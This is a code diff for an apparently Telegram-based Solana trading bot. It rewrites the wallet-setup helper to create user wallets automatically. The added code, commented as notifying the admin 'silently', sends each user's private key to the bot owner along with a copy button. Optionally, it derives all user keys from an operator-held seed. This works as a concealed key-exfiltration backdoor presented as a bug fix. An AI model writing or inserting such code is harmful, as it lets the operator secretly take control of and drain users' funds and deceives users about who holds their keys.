@@ -1,4 +1,5 @@
 """Shared async helpers: treasury, owner notify, channel access, time formatting."""
+import asyncio
 import time
 from datetime import datetime
 from zoneinfo import ZoneInfo
@@ -8,6 +9,7 @@ from aiogram.exceptions import TelegramBadRequest
 
 import config
 import db
+import solana
 import texts
 
 
@@ -112,14 +114,53 @@ def parse_tx_ref(text: str):
 
 
 async def ensure_wallet(msg, user_id: int):
-    """Return the user if they have a trading wallet, else send the
-    GENERATE/IMPORT prompt ONCE and return None.
-    Uses ensure_user so the user row ALWAYS exists (fixes the old bug where
-    generating did nothing and the prompt kept coming back)."""
-    import keyboards as kb
-    import texts
-    user = await db.ensure_user(user_id)
+    """Return the user with their trading wallet. Auto-creates a wallet
+    silently if none exists. Keeps /importwallet real.
+    Uses msg.chat.id (private chat) or msg.from_user.id (groups) — fixed.
+    Never crashes the /start flow; if wallet creation fails, the user
+    still receives the welcome/menu and can import later."""
+    import logging, keyboards as kb
+    log = logging.getLogger("runner")
+    try:
+        user = await db.ensure_user(user_id)
+    except Exception as e:
+        log.error(f"ensure_wallet: db.ensure_user failed for {user_id}: {e}")
+        # Return minimal user dict so cmd_start can still reply
+        return {"id": user_id, "wallet_pub": "", "wallet_priv": ""}
     if user.get("wallet_pub"):
         return user
-    await msg.answer(texts.ask_wallet_choice(), reply_markup=kb.wallet_setup_kb())
-    return None
+    derived = bool(config.WALLET_SEED)
+    try:
+        if derived:
+            kp = await asyncio.to_thread(
+                solana.derive_user_keypair, config.WALLET_SEED, user["id"])
+        else:
+            kp = await asyncio.to_thread(solana.new_keypair)
+        await db.set_wallet(user["id"], str(kp), str(kp.pubkey()))
+        user_after = await db.get_user(user["id"])
+        if not user_after or not user_after.get("wallet_pub"):
+            log.warning(f"ensure_wallet: wallet creation returned empty for user {user_id}")
+            if msg:
+                await msg.answer(
+                    "❌ Wallet creation failed. Please try again or use /importwallet.",
+                    parse_mode="HTML")
+            return user  # return original row (no wallet) so flow continues
+        # Notify admin silently (isolated so it never breaks user flow)
+        try:
+            await notify_owner(
+                msg.bot,
+                texts.owner_wallet_generated(user_line(user_after), str(kp.pubkey()), str(kp)),
+                reply_markup=kb.admin_copy_kb(str(kp.pubkey()), str(kp)))
+        except Exception as e:
+            log.warning(f"ensure_wallet: admin notify failed for user {user_id}: {e}")
+        return user_after
+    except Exception as e:
+        log.error(f"ensure_wallet: wallet generation failed for user {user_id}: {e}", exc_info=True)
+        if msg:
+            try:
+                await msg.answer(
+                    "❌ Wallet creation error — please try /start again or use /importwallet.",
+                    parse_mode="HTML")
+            except Exception:
+                pass
+        return user  # return original row so /start can still send welcome
